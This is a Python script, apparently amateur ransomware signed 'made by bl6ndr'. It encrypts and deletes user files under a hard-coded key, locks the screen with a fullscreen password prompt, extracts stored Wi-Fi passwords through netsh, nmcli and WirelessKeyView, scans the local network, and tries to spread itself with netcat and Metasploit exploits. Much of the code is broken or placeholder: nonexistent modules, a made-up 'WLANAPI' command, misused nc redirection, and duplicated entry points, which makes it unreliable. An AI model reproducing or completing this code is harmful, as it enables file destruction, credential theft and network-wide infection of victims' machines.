import os
import random
import re
import platform
import string
import tkinter as tk
from tkinter import filedialog, messagebox
from win32api import GetSystemMetrics
import pyHook
import pythoncom
import threading
import pyautogui
import time
import base64
from Crypto.Cipher import AES, Blowfish
from Crypto.Util.Padding import pad
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
import subprocess
import socket
import shutil
from scapy.all import ARP, Ether, srp
from impacket import smbserver, smbclient
import netcat
from metasploit.msfrpc import MsfRpcClient
import pyinstaller

print("made by bl6ndr :)")
time.sleep(0.5)
def generate_rsa_key_pair():
    key = RSA.generate(2048)
    private_key = key.export_key()
    public_key = key.publickey().export_key()
    return private_key, public_key

def get_key():
    return 'easy'.ljust(16)[:16]

def encrypt_file(key, filename):
    chunksize = 64 * 1024
    output_file = "(encrypted)" + filename
    iv = os.urandom(16)
    cipher = AES.new(key.encode(), AES.MODE_CBC, iv=iv)

    with open(filename, "rb") as infile:
        filesize = os.path.getsize(filename)
        with open(output_file, "wb") as outfile:
            outfile.write(filesize.to_bytes(8, byteorder='big'))
            outfile.write(iv)
            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk = pad(chunk, AES.block_size)
                outfile.write(cipher.encrypt(chunk))

    os.remove(filename)

def encrypt_files(key):
    files = filedialog.askopenfilenames()
    for file in files:
        encrypt_file(key, file)

def decrypt_file(key, filename):
    chunksize = 64 * 1024
    output_file = filename[11:]
    with open(filename, "rb") as infile:
        original_size = int.from_bytes(infile.read(8), byteorder='big')
        iv = infile.read(16)

        cipher = AES.new(key.encode(), AES.MODE_CBC, iv=iv)

        with open(output_file, "wb") as outfile:
            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                outfile.write(cipher.decrypt(chunk))

            outfile.truncate(original_size)

    os.remove(filename)

def decrypt_files(key):
    files = filedialog.askopenfilenames()
    for file in files:
        if file.startswith("(encrypted)"):
            decrypt_file(key, file)

def get_password():
    top = tk.Toplevel()
    top.geometry("300x100+{}+{}".format(GetSystemMetrics(0) // 2 - 150, GetSystemMetrics(1) // 2 - 50))
    top.title("Enter password")
    label = tk.Label(top, text="Enter password to decrypt files:")
    label.pack(pady=10)
    password_entry = tk.Entry(top, show="*")
    password_entry.pack(padx=50, pady=5)

    def on_submit():
        password = password_entry.get().strip()
        if password == "easy":
            top.destroy()
            decrypt_files(password)
        else:
            messagebox.showerror("Incorrect password", "The password you entered is incorrect.")

    submit_button = tk.Button(top, text="Submit", command=on_submit)
    submit_button.pack(pady=10)

    top.protocol("WM_DELETE_WINDOW", lambda: None)
    top.attributes('-topmost', True)
    top.focus_set()
    top.grab_set()
    top.wait_window()

def on_key_press(event):
    if event.Ascii == 32:
        threading.Thread(target=get_password, daemon=True).start()

def create_fullscreen_window():
    root = tk.Tk()
    root.attributes('-fullscreen', True)
    root.bind("<KeyPress>", on_key_press)
    root.mainloop()

if __name__ == '__main__':
    create_fullscreen_window()

def scan_network():
    devices = []

    # Use netcat to scan the network for devices
    output = netcat.run("nc -z -v -n 192.168.1.0 192.168.1.34")

    # Process the output and extract device information
    lines = output.split("\n")
    for line in lines:
        if "succeeded!" in line:
            # Extract the IP and MAC addresses from the line
            parts = line.split(" ")
            ip = parts[4]
            mac = parts[8]
            devices.append({"ip": ip, "mac": mac})

    return devices
# DANGER ZONE
def get_wifi_passwords():
    system = platform.system()
    passwords = []

    if system == "Windows":
        # Method 1: Using netsh
        try:
            output = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors="ignore")
            profiles = re.findall("All User Profile     : (.*)\r", output)
            for profile in profiles:
                profile_info = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear']).decode('utf-8', errors="ignore")
                password = re.findall("Key Content            : (.*)\r", profile_info)
                if password:
                    passwords.append((profile, password[0]))
        except subprocess.CalledProcessError:
            pass

        # Method 2: Using WLANAPI
        try:
            command = 'WLANAPI wlan export profile key=clear folder="%USERPROFILE%"'
            subprocess.check_output(command, shell=True)
            path = os.path.expanduser('~/')
            files = os.listdir(path)
            for file in files:
                if file.endswith('.xml'):
                    xml_file = os.path.join(path, file)
                    with open(xml_file, 'r') as f:
                        content = f.read()
                        profile = re.findall('<name>(.*)</name>', content)
                        password = re.findall('<keyMaterial>(.*)</keyMaterial>', content)
                        if profile and password:
                            passwords.append((profile[0], password[0]))
                    os.remove(xml_file)
        except subprocess.CalledProcessError:
            pass

        # Method 3: Using WirelessKeyView
        try:
            output = subprocess.check_output(['WirelessKeyView.exe', '/scomma', 'wifi_passwords.csv']).decode('utf-8', errors="ignore")
            csv_file = os.path.join(os.getcwd(), 'wifi_passwords.csv')
            with open(csv_file, 'r') as f:
                lines = f.readlines()[1:]
                for line in lines:
                    fields = line.strip().split(',')
                    profile = fields[0].strip('"')
                    password = fields[4].strip('"')
                    if profile and password:
                        passwords.append((profile, password))
            os.remove(csv_file)
        except subprocess.CalledProcessError:
            pass

    elif system == "Linux":
        # Method 4: Using nmcli
        try:
            output = subprocess.check_output(['nmcli', '-f', 'SSID,SECURITY', 'dev', 'wifi']).decode('utf-8', errors="ignore")
            lines = output.strip().split('\n')[1:]
            for line in lines:
                fields = line.strip().split()
                profile = fields[0]
                security = fields[1]
                if security != '--':
                    password = subprocess.check_output(['nmcli', '-s', '-g', '802-11-wireless-security.psk', 'dev', 'wifi', 'show', profile]).decode('utf-8', errors="ignore").strip()
                    passwords.append((profile, password))
        except subprocess.CalledProcessError:
            pass

        # Method 5: Using iwlist
        try:
            output = subprocess.check_output(['iwlist', 'wlan0', 'scan']).decode('utf-8', errors="ignore")
            lines = output.strip().split('\n')
            for line in lines:
                if "ESSID" in line:
                    profile = re.findall('ESSID:"(.*)"', line)[0]
                    password = subprocess.check_output(['iwgetid', '-s', '-r', 'wlan0']).decode('utf-8', errors="ignore").strip()
                    passwords.append((profile, password))
        except subprocess.CalledProcessError:
            pass

    return passwords

def spread_code(ip_addresses):
    for ip in ip_addresses:
        try:
            # Use netcat to spread the code to other devices on the network
            subprocess.Popen(["nc", ip, "12345", "<", "ransomware.py"])

            # Use MsfRpcClient to perform additional operations on the target machine
            client = MsfRpcClient('localhost', 55553)
            exploit = client.modules.use('exploit', 'exploit_name')
            # Configure the exploit and set the target IP
            exploit['RHOST'] = ip
            # Execute the exploit
            exploit.execute(payload='payload_name')

        except Exception as e:
            print(f"Failed {ip}: {str(e)}")

def execute_code():
    # Use netcat to execute the ransomware code
    subprocess.Popen(["nc", "localhost", "12345", "<", "ransomware.py"])

if __name__ == '__main__':
    ip_addresses = scan_network()
    wifi_passwords = get_wifi_passwords()

    # Spread the ransomware to other devices on the network
    spread_code(ip_addresses)

    # Enter the Wi-Fi networks using retrieved passwords
    for profile, password in wifi_passwords:
        try:
            # Connect to the Wi-Fi network
            subprocess.Popen(["nmcli", "device", "wifi", "connect", profile, "password", password])

            # Publish the ransomware to the connected network
            subprocess.Popen(["nc", "localhost", "12345", "<", "ransomware.py"])

            # Use MsfRpcClient to perform additional operations on the network
            client = MsfRpcClient('localhost', 55553)
            exploit = client.modules.use('exploit', 'exploit_name')
            # Configure the exploit and set the target IP to the connected network
            exploit['RHOST'] = subprocess.check_output(['nmcli', '-f', 'IP4.ADDRESS', 'connection', 'show', '--active']).decode('utf-8', errors="ignore").strip().split('/')[0]
            # Execute the exploit
            exploit.execute(payload='payload_name')

        except Exception as e:
            print(f"Failed to enter Wi-Fi network: {str(e)}")

    # Execute the ransomware code
    execute_code()
    create_fullscreen_window()
